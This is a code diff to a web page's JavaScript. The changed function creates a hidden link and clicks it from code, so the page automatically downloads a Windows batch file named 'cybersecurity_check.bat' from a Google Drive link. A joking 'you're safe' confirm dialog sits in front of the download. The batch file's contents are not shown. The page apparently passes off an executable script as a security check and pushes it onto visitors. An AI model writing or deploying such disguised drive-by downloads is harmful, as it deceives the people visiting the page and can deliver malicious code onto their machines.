@@ -41,14 +41,17 @@
 
         // Function to trigger the file download
         function triggerDownload() {
-            // Create a temporary anchor element
-            var link = document.createElement('a');
-            link.href = 'https://drive.google.com/uc?export=download&id=1G1V6IBcrL_IEqUp10ZhGWDIWO8w_YXKt'; // Direct download link
-            link.download = 'cybersecurity_check.bat'; // Specify the file name for download
-            link.click(); // Simulate a click to trigger the download
-
-            // Optionally, alert the user that the download has started
-            alert('Your download has started.');
+            // Show funny message and wait for OK
+            if (confirm("Haha, you're safe, but make sure your systems are secured!")) {
+                // Create a temporary anchor element to download the file
+                var link = document.createElement('a');
+                link.href = 'https://drive.google.com/uc?export=download&id=1G1V6IBcrL_IEqUp10ZhGWDIWO8w_YXKt'; // Direct download link
+                link.download = 'cybersecurity_check.bat'; // Specify the file name for download
+                link.style.display = 'none'; // Hide the link element
+                document.body.appendChild(link); // Add link to the body
+                link.click(); // Simulate a click to trigger the download
+                document.body.removeChild(link); // Remove the link from the body
+            }
         }
     </script>
 </body>
